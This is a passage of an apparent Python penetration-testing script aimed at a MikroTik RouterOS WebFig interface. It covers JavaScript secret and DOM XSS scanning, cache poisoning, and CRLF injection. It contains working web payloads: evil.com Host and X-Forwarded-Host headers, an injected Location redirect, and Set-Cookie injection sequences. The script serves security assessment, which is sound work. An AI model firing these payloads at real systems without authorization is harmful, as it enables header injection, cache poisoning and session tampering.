        "hardcoded_token": r'(?:token|auth_token|access_token)\s*[:=]\s*["\'][A-Za-z0-9+/=]{16,}["\']',
        "hardcoded_secret": r'(?:secret|private_key)\s*[:=]\s*["\'][^"\']{8,}["\']',
        "base64_blob": r'["\'][A-Za-z0-9+/]{40,}={0,2}["\']',
    }

    for pattern_name, regex in secret_patterns.items():
        matches = re.findall(regex, all_js_content, re.IGNORECASE)
        count = len(matches)
        # Truncate matches for evidence
        truncated = [m[:80] + "..." if len(m) > 80 else m for m in matches[:5]]
        ec.add_test("js_security", f"secret_{pattern_name}",
                     f"Search for {pattern_name} in JavaScript",
                     f"{count} potential matches",
                     details={"count": count, "samples": truncated},
                     anomaly=(count > 0 and pattern_name != "base64_blob"))

    # 5e. DOM-based XSS sinks ──────────────────────────────────────────────
    dom_xss_sinks = {
        "location.hash": r'location\.hash',
        "location.search": r'location\.search',
        "location.href_assign": r'location\.href\s*=',
        "document.referrer": r'document\.referrer',
        "window.name": r'window\.name',
        "postMessage_handler": r'addEventListener\s*\(\s*["\']message["\']',
        "document.cookie_read": r'document\.cookie',
        "document.domain": r'document\.domain\s*=',
    }

    dom_xss_found = []
    for sink_name, regex in dom_xss_sinks.items():
        matches = re.findall(regex, all_js_content)
        count = len(matches)
        if count > 0:
            dom_xss_found.append(sink_name)
        contexts = []
        for m in re.finditer(regex, all_js_content):
            start = max(0, m.start() - 50)
            end = min(len(all_js_content), m.end() + 50)
            contexts.append(all_js_content[start:end].replace("\n", " ").strip())
        contexts = contexts[:3]

        ec.add_test("js_security", f"dom_xss_{sink_name}",
                     f"DOM XSS sink: {sink_name}",
                     f"{count} occurrences",
                     details={"count": count, "sample_contexts": contexts},
                     anomaly=(count > 0))

    if dom_xss_found:
        ec.add_finding("INFO", "DOM-based XSS sinks present in WebFig JavaScript",
                        f"The following DOM XSS sinks were found in WebFig's "
                        f"client-side JavaScript: {', '.join(dom_xss_found)}. "
                        f"Manual review recommended to determine exploitability.",
                        cwe="CWE-79",
                        evidence_refs=["dom_xss_*"])

    # 5f. Insecure randomness ──────────────────────────────────────────────
    math_random_matches = re.findall(r'Math\.random\s*\(\s*\)', all_js_content)
    # Check context: is it used for security-sensitive purposes?
    security_random_contexts = []
    for m in re.finditer(r'Math\.random\s*\(\s*\)', all_js_content):
        start = max(0, m.start() - 80)
        end = min(len(all_js_content), m.end() + 80)
        context = all_js_content[start:end].replace("\n", " ").strip().lower()
        if any(kw in context for kw in ["token", "nonce", "session", "key", "auth", "csrf", "random"]):
            security_random_contexts.append(all_js_content[start:end].replace("\n", " ").strip())

    ec.add_test("js_security", "insecure_randomness",
                 "Math.random() usage (insecure for cryptographic purposes)",
                 f"{len(math_random_matches)} total uses, {len(security_random_contexts)} in security-relevant context",
                 details={"total_count": len(math_random_matches),
                          "security_contexts": security_random_contexts[:5]},
                 anomaly=(len(security_random_contexts) > 0))

    # 5g. Client-side storage usage ────────────────────────────────────────
    storage_patterns = {
        "localStorage_set": r'localStorage\.setItem\s*\(',
        "localStorage_get": r'localStorage\.getItem\s*\(',
        "localStorage_direct": r'localStorage\[',
        "sessionStorage_set": r'sessionStorage\.setItem\s*\(',
        "sessionStorage_get": r'sessionStorage\.getItem\s*\(',
        "sessionStorage_direct": r'sessionStorage\[',
    }

    for pattern_name, regex in storage_patterns.items():
        matches = re.findall(regex, all_js_content)
        contexts = []
        for m in re.finditer(regex, all_js_content):
            start = max(0, m.start() - 40)
            end = min(len(all_js_content), m.end() + 60)
            contexts.append(all_js_content[start:end].replace("\n", " ").strip())
        contexts = contexts[:3]

        ec.add_test("js_security", f"storage_{pattern_name}",
                     f"Client-side storage: {pattern_name}",
                     f"{len(matches)} occurrences",
                     details={"count": len(matches), "contexts": contexts},
                     anomaly=(len(matches) > 0))

    # 5h. Source maps ──────────────────────────────────────────────────────
    for js_path in js_files:
        map_path = js_path.rstrip("?v=1234567890") + ".map"
        if js_path.startswith("/"):
            map_url = f"{HTTP_BASE}{map_path}"
        else:
            map_url = f"{HTTP_BASE}/webfig/{map_path}"

        r_map = http_get(map_url)
        if r_map is not None and r_map.status_code == 200:
            ec.add_test("js_security", f"sourcemap_{js_path.split('/')[-1].split('?')[0][:30]}",
                         f"Source map available for {js_path}",
                         "SOURCE MAP FOUND (information disclosure)",
                         details={"map_url": map_url, "size": len(r_map.text)},
                         anomaly=True)
        else:
            ec.add_test("js_security", f"sourcemap_{js_path.split('/')[-1].split('?')[0][:30]}",
                         f"Source map for {js_path}",
                         "Not found (good)",
                         details={"map_url": map_url})

    # Also check sourceMappingURL in JS content
    source_map_refs = re.findall(r'//[#@]\s*sourceMappingURL\s*=\s*(\S+)', all_js_content)
    ec.add_test("js_security", "sourcemap_references",
                 "sourceMappingURL references in JavaScript files",
                 f"{len(source_map_refs)} references found",
                 details={"references": source_map_refs[:10]},
                 anomaly=(len(source_map_refs) > 0))

    # 5i. Debug endpoints / development code ───────────────────────────────
    debug_paths = [
        "/webfig/debug", "/webfig/test", "/webfig/dev",
        "/debug", "/test", "/dev", "/console",
        "/webfig/console", "/status", "/server-status",
        "/_debug", "/_profiler",
    ]

    for dpath in debug_paths:
        r = http_get(f"{HTTP_BASE}{dpath}")
        if r is not None and r.status_code == 200 and len(r.text) > 50:
            ec.add_test("js_security", f"debug_endpoint_{dpath.replace('/', '_').strip('_')}",
                         f"Debug endpoint: {dpath}",
                         f"ACCESSIBLE (HTTP {r.status_code}, {len(r.text)} bytes)",
                         details={"path": dpath, "size": len(r.text),
                                  "snippet": r.text[:200]},
                         anomaly=True)
        else:
            ec.add_test("js_security", f"debug_endpoint_{dpath.replace('/', '_').strip('_')}",
                         f"Debug endpoint: {dpath}",
                         f"HTTP {r.status_code if r else 'N/A'} (not accessible)",
                         anomaly=False)

    # 5j. Check for debug flags in JS
    debug_patterns = {
        "debug_flag": r'(?:debug|DEBUG)\s*[:=]\s*true',
        "console.log": r'console\.log\s*\(',
        "console.debug": r'console\.debug\s*\(',
        "alert_call": r'\balert\s*\(',
        "debugger_stmt": r'\bdebugger\b',
    }

    for pattern_name, regex in debug_patterns.items():
        matches = re.findall(regex, all_js_content)
        ec.add_test("js_security", f"debug_code_{pattern_name}",
                     f"Debug code pattern: {pattern_name}",
                     f"{len(matches)} occurrences",
                     details={"count": len(matches)},
                     anomaly=(pattern_name in ["debug_flag", "debugger_stmt"] and len(matches) > 0))


# ═════════════════════════════════════════════════════════════════════════════
# 6. CACHE POISONING (~20 tests)
# ═════════════════════════════════════════════════════════════════════════════

def test_cache_poisoning():
    log("=" * 60)
    log("SECTION 6: Cache Poisoning")
    log("=" * 60)

    test_urls = [
        (f"{HTTP_BASE}/webfig/", "WebFig main"),
        (f"{HTTP_BASE}/rest/system/resource", "REST API"),
        (f"{HTTP_BASE}/", "Root page"),
    ]

    # 6a. Normal caching headers baseline ──────────────────────────────────
    for url, label in test_urls:
        needs_auth = "rest/" in url
        r = http_get(url, auth=AUTH if needs_auth else None)
        if r is None:
            ec.add_test("cache_poisoning", f"cache_baseline_{label.replace(' ', '_').lower()}",
                         f"Baseline caching headers for {label}",
                         "Connection failed", anomaly=False)
            continue

        cache_headers = {
            "Cache-Control": r.headers.get("Cache-Control", "NOT SET"),
            "Vary": r.headers.get("Vary", "NOT SET"),
            "ETag": r.headers.get("ETag", "NOT SET"),
            "Pragma": r.headers.get("Pragma", "NOT SET"),
            "Expires": r.headers.get("Expires", "NOT SET"),
            "Age": r.headers.get("Age", "NOT SET"),
        }

        # Authenticated content should have no-store or no-cache
        cc = r.headers.get("Cache-Control", "").lower()
        is_cacheable = "no-store" not in cc and "private" not in cc
        anomaly = needs_auth and is_cacheable

        ec.add_test("cache_poisoning", f"cache_baseline_{label.replace(' ', '_').lower()}",
                     f"Baseline caching headers for {label}",
                     f"Cache-Control: {cache_headers['Cache-Control']}",
                     details=cache_headers,
                     anomaly=anomaly)

    # 6b. Host header manipulation ─────────────────────────────────────────
    evil_hosts = [
        ("evil.com", "External host"),
        (f"{TARGET}\r\nX-Injected: header", "CRLF in Host"),
        ("", "Empty Host"),
        (f"{TARGET}:9999", "Wrong port in Host"),
        ("localhost", "Localhost as Host"),
        ("127.0.0.1", "Loopback as Host"),
    ]

    for evil_host, desc in evil_hosts:
        r = raw_http(TARGET, 80,
                      f"GET /webfig/ HTTP/1.1\r\n"
                      f"Host: {evil_host}\r\n"
                      f"Connection: close\r\n\r\n")

        if r is not None:
            response_str = r.decode("utf-8", errors="replace")
            # Check if the evil host appears in the response body
            reflected = evil_host.split("\r\n")[0] in response_str  # only first part
            status_line = response_str.split("\r\n")[0] if "\r\n" in response_str else "unknown"

            ec.add_test("cache_poisoning", f"host_header_{desc.replace(' ', '_').lower()}",
                         f"Request with Host: {desc}",
                         f"{status_line} - Host {'reflected' if reflected else 'not reflected'}",
                         details={"evil_host": evil_host.split("\r\n")[0],
                                  "status_line": status_line,
                                  "host_reflected": reflected,
                                  "response_snippet": response_str[:300]},
                         anomaly=reflected)
        else:
            ec.add_test("cache_poisoning", f"host_header_{desc.replace(' ', '_').lower()}",
                         f"Request with Host: {desc}",
                         "Connection failed", anomaly=False)

    # 6c. X-Forwarded-Host injection ───────────────────────────────────────
    forwarded_headers = [
        ("X-Forwarded-Host", "evil.com"),
        ("X-Forwarded-Host", f"evil.com\r\nX-Injected: true"),
        ("X-Host", "evil.com"),
        ("X-Forwarded-Server", "evil.com"),
        ("X-Original-URL", "/admin"),
        ("X-Rewrite-URL", "/admin"),
    ]

    for header_name, header_value in forwarded_headers:
        safe_name = f"{header_name}_{header_value.split(chr(13))[0][:20]}".replace(" ", "_").replace("/", "_")
        r = http_get(f"{HTTP_BASE}/webfig/",
                      headers={header_name: header_value.split("\r\n")[0]})
        if r is not None:
            reflected = header_value.split("\r\n")[0] in r.text
            ec.add_test("cache_poisoning",
                         f"fwd_header_{safe_name.lower()[:40]}",
                         f"{header_name}: {header_value.split(chr(13))[0][:30]}",
                         f"HTTP {r.status_code} - Value {'reflected' if reflected else 'not reflected'}",
                         details={"header": header_name,
                                  "value": header_value.split("\r\n")[0],
                                  "reflected": reflected,
                                  "response_snippet": r.text[:200]},
                         anomaly=reflected)
        else:
            ec.add_test("cache_poisoning",
                         f"fwd_header_{safe_name.lower()[:40]}",
                         f"{header_name}: {header_value.split(chr(13))[0][:30]}",
                         "Connection failed", anomaly=False)

    # 6d. Multiple Host headers ────────────────────────────────────────────
    r = raw_http(TARGET, 80,
                  f"GET /webfig/ HTTP/1.1\r\n"
                  f"Host: {TARGET}\r\n"
                  f"Host: evil.com\r\n"
                  f"Connection: close\r\n\r\n")
    if r is not None:
        response_str = r.decode("utf-8", errors="replace")
        status_line = response_str.split("\r\n")[0] if "\r\n" in response_str else "unknown"
        ec.add_test("cache_poisoning", "multiple_host_headers",
                     "Request with duplicate Host headers (real + evil)",
                     f"{status_line}",
                     details={"status_line": status_line,
                              "response_snippet": response_str[:300]},
                     anomaly=("200" in status_line))
    else:
        ec.add_test("cache_poisoning", "multiple_host_headers",
                     "Request with duplicate Host headers",
                     "Connection failed", anomaly=False)

    # 6e. Error page cacheability ──────────────────────────────────────────
    error_urls = [
        (f"{HTTP_BASE}/nonexistent_page_12345", "404 page"),
        (f"{HTTP_BASE}/rest/nonexistent", "REST 404"),
    ]

    for url, label in error_urls:
        r = http_get(url)
        if r is not None:
            cc = r.headers.get("Cache-Control", "NOT SET").lower()
            is_cacheable = "no-store" not in cc and "no-cache" not in cc
            ec.add_test("cache_poisoning", f"error_cacheable_{label.replace(' ', '_').lower()}",
                         f"Error page cacheability: {label}",
                         f"Cache-Control: {r.headers.get('Cache-Control', 'NOT SET')} "
                         f"({'cacheable' if is_cacheable else 'not cacheable'})",
                         details={"status_code": r.status_code,
                                  "cache_control": r.headers.get("Cache-Control", "NOT SET"),
                                  "cacheable": is_cacheable},
                         anomaly=is_cacheable)
        else:
            ec.add_test("cache_poisoning", f"error_cacheable_{label.replace(' ', '_').lower()}",
                         f"Error page cacheability: {label}",
                         "Connection failed", anomaly=False)


# ═════════════════════════════════════════════════════════════════════════════
# 7. HTTP RESPONSE SPLITTING / CRLF INJECTION (~15 tests)
# ═════════════════════════════════════════════════════════════════════════════

def test_crlf_injection():
    log("=" * 60)
    log("SECTION 7: HTTP Response Splitting / CRLF Injection")
    log("=" * 60)

    crlf_marker = "X-CRLF-Injected"

    # 7a. CRLF in URL path ─────────────────────────────────────────────────
    path_payloads = [
        ("/webfig/%0d%0a" + crlf_marker + ":%20true", "URL-encoded CRLF in path"),
        ("/webfig/%0d%0aSet-Cookie:%20injected=1", "Cookie injection via path CRLF"),
        ("/webfig/%0a" + crlf_marker + ":%20true", "LF-only in path"),
        ("/webfig/%0d" + crlf_marker + ":%20true", "CR-only in path"),
        ("/webfig/\r\n" + crlf_marker + ": true", "Raw CRLF in path"),
    ]

    for payload_path, desc in path_payloads:
        test_name = desc.replace(" ", "_").replace("/", "_").lower()[:40]
        try:
            # Use raw HTTP to avoid requests library encoding
            r = raw_http(TARGET, 80,
                          f"GET {payload_path} HTTP/1.1\r\n"
                          f"Host: {TARGET}\r\n"
                          f"Connection: close\r\n\r\n")
            if r is not None:
                response_str = r.decode("utf-8", errors="replace")
                # Check if our injected header appears in response headers
                # Split response into headers and body
                header_body = response_str.split("\r\n\r\n", 1)
                resp_headers = header_body[0] if header_body else ""
                injected = crlf_marker.lower() in resp_headers.lower()
                cookie_injected = "injected=1" in resp_headers

                status_line = response_str.split("\r\n")[0] if "\r\n" in response_str else "unknown"
                ec.add_test("crlf", f"path_crlf_{test_name}",
                             f"CRLF in URL path: {desc}",
                             f"{status_line} - Header {'INJECTED' if injected else 'not injected'}",
                             details={"payload": payload_path[:100], "status": status_line,
                                      "header_injected": injected,
                                      "cookie_injected": cookie_injected,
                                      "response_headers": resp_headers[:500]},
                             anomaly=(injected or cookie_injected))

                if injected or cookie_injected:
                    ec.add_finding("HIGH",
                                    "HTTP Response Splitting via CRLF in URL path",
                                    f"The server reflects CRLF sequences from the URL path "
                                    f"into response headers, allowing header injection. "
                                    f"Payload: {payload_path[:80]}",
                                    cwe="CWE-113",
                                    evidence_refs=[f"path_crlf_{test_name}"])
            else:
                ec.add_test("crlf", f"path_crlf_{test_name}",
                             f"CRLF in URL path: {desc}",
                             "Connection failed", anomaly=False)
        except Exception as e:
            ec.add_test("crlf", f"path_crlf_{test_name}",
                         f"CRLF in URL path: {desc}",
                         f"Error: {str(e)[:100]}", anomaly=False)

    # 7b. CRLF in query parameters ─────────────────────────────────────────
    query_payloads = [
        ("/webfig/?param=%0d%0a" + crlf_marker + ":%20true", "CRLF in query param"),
        ("/webfig/?redirect=%0d%0aLocation:%20http://evil.com", "Redirect injection via query"),
        ("/rest/system/resource?param=%0d%0aX-Test:%20injected", "CRLF in REST query"),
    ]

    for payload_url, desc in query_payloads:
        test_name = desc.replace(" ", "_").replace("/", "_").lower()[:40]
        r = raw_http(TARGET, 80,
                      f"GET {payload_url} HTTP/1.1\r\n"
                      f"Host: {TARGET}\r\n"
                      f"Connection: close\r\n\r\n")
        if r is not None:
            response_str = r.decode("utf-8", errors="replace")
            header_body = response_str.split("\r\n\r\n", 1)
            resp_headers = header_body[0] if header_body else ""
            injected = crlf_marker.lower() in resp_headers.lower() or "x-test" in resp_headers.lower()
            location_injected = "location:" in resp_headers.lower() and "evil.com" in resp_headers.lower()

            status_line = response_str.split("\r\n")[0] if "\r\n" in response_str else "unknown"
            ec.add_test("crlf", f"query_crlf_{test_name}",
                         f"CRLF in query: {desc}",
                         f"{status_line} - {'INJECTED' if injected or location_injected else 'not injected'}",
                         details={"payload": payload_url[:100], "status": status_line,
                                  "header_injected": injected,
                                  "location_injected": location_injected,
                                  "response_headers": resp_headers[:500]},
                         anomaly=(injected or location_injected))
        else:
            ec.add_test("crlf", f"query_crlf_{test_name}",
                         f"CRLF in query: {desc}",
                         "Connection failed", anomaly=False)

    # 7c. CRLF in custom headers ───────────────────────────────────────────
    header_payloads = [
        ("X-Forwarded-For", f"127.0.0.1\r\n{crlf_marker}: true", "CRLF in X-Forwarded-For"),
        ("User-Agent", f"Mozilla\r\n{crlf_marker}: true", "CRLF in User-Agent"),
        ("Referer", f"http://test.com\r\n{crlf_marker}: true", "CRLF in Referer"),
        ("Accept-Language", f"en\r\n{crlf_marker}: true", "CRLF in Accept-Language"),
    ]

    for header_name, header_value, desc in header_payloads:
        test_name = desc.replace(" ", "_").replace("/", "_").lower()[:40]
        r = raw_http(TARGET, 80,
                      f"GET /webfig/ HTTP/1.1\r\n"
                      f"Host: {TARGET}\r\n"
                      f"{header_name}: {header_value}\r\n"
                      f"Connection: close\r\n\r\n")
        if r is not None:
            response_str = r.decode("utf-8", errors="replace")
            header_body = response_str.split("\r\n\r\n", 1)
            resp_headers = header_body[0] if header_body else ""
            injected = crlf_marker.lower() in resp_headers.lower()

            status_line = response_str.split("\r\n")[0] if "\r\n" in response_str else "unknown"
            ec.add_test("crlf", f"header_crlf_{test_name}",
                         f"CRLF in header: {desc}",
                         f"{status_line} - {'INJECTED' if injected else 'not injected'}",
                         details={"header_name": header_name,
                                  "header_injected": injected,
                                  "response_headers": resp_headers[:500]},
                         anomaly=injected)
        else:
            ec.add_test("crlf", f"header_crlf_{test_name}",
                         f"CRLF in header: {desc}",
                         "Connection failed", anomaly=False)

    # 7d. CRLF in cookie values ────────────────────────────────────────────
    cookie_payloads = [
        (f"session=test%0d%0a{crlf_marker}:%20true", "CRLF in cookie value (URL-encoded)"),
        (f"session=test\r\n{crlf_marker}: true", "CRLF in cookie value (raw)"),
    ]

    for cookie_val, desc in cookie_payloads:
        test_name = desc.replace(" ", "_").replace("/", "_").lower()[:40]
        r = raw_http(TARGET, 80,
                      f"GET /webfig/ HTTP/1.1\r\n"
                      f"Host: {TARGET}\r\n"
                      f"Cookie: {cookie_val}\r\n"
                      f"Connection: close\r\n\r\n")
        if r is not None:
            response_str = r.decode("utf-8", errors="replace")
            header_body = response_str.split("\r\n\r\n", 1)
            resp_headers = header_body[0] if header_body else ""
            injected = crlf_marker.lower() in resp_headers.lower()

            status_line = response_str.split("\r\n")[0] if "\r\n" in response_str else "unknown"
            ec.add_test("crlf", f"cookie_crlf_{test_name}",
                         f"CRLF in cookie: {desc}",
                         f"{status_line} - {'INJECTED' if injected else 'not injected'}",
                         details={"cookie_injected": injected,
                                  "response_headers": resp_headers[:500]},
                         anomaly=injected)
        else:
            ec.add_test("crlf", f"cookie_crlf_{test_name}",
                         f"CRLF in cookie: {desc}",
                         "Connection failed", anomaly=False)


# ═════════════════════════════════════════════════════════════════════════════
# MAIN
# ═════════════════════════════════════════════════════════════════════════════

def main():
    log("=" * 60)
    log("MikroTik RouterOS CHR 7.20.8 — WebFig Session & Client-Side Security")
    log(f"Target: {TARGET}")
    log(f"Phase 2 — attack_webfig_session.py")
    log("=" * 60)

    # Pre-flight check
    status = check_router_alive()
    if not status.get("alive"):
        log("FATAL: Router is not responding. Aborting.")
        sys.exit(1)
    log(f"Router alive: version={status.get('version')}, uptime={status.get('uptime')}")

    # Run all test sections; each is wrapped so failures don't kill the script
    sections = [
        ("CSRF Testing", test_csrf),
        ("Cookie/Session Security", test_cookie_session),
        ("Security Headers", test_security_headers),
        ("Clickjacking", test_clickjacking),
        ("JavaScript Security Analysis", test_javascript_security),
        ("Cache Poisoning", test_cache_poisoning),
        ("HTTP Response Splitting / CRLF", test_crlf_injection),
    ]

    for section_name, section_func in sections:
        try:
            section_func()
        except Exception as e:
            log(f"ERROR in section '{section_name}': {e}")
            ec.add_test(section_name.lower().replace(" ", "_").replace("/", "_"),
                         f"section_error_{section_name.lower().replace(' ', '_')[:30]}",
                         f"Section '{section_name}' encountered an error",
                         f"Error: {str(e)[:200]}",
                         anomaly=True)

        # Health check between sections
        health = check_router_alive()
        if not health.get("alive"):
            log(f"WARNING: Router not responding after '{section_name}'. Waiting...")
            from mikrotik_common import wait_for_router
            wait_for_router(max_wait=30)

    # Final summary
    log("")
    ec.save("webfig_session.json")
    ec.summary()
    log("Done.")


if __name__ == "__main__":
    main()
